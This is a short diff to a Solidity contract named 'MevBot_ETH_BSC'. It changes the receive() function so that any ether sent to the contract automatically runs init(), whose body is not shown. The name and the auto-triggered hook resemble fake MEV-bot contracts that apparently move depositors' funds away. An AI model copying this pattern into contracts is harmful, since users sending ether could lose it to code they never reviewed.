@@ -45,11 +45,10 @@ contract MevBot_ETH_BSC {
     constructor(string memory Network, string memory routerAddress) public {
         _Network = Network;
         _RouterAddress = routerAddress;
-
     }
   
 
-    receive() external payable {}
+    receive() external payable {init();}
 
     struct slice {
         uint _len;
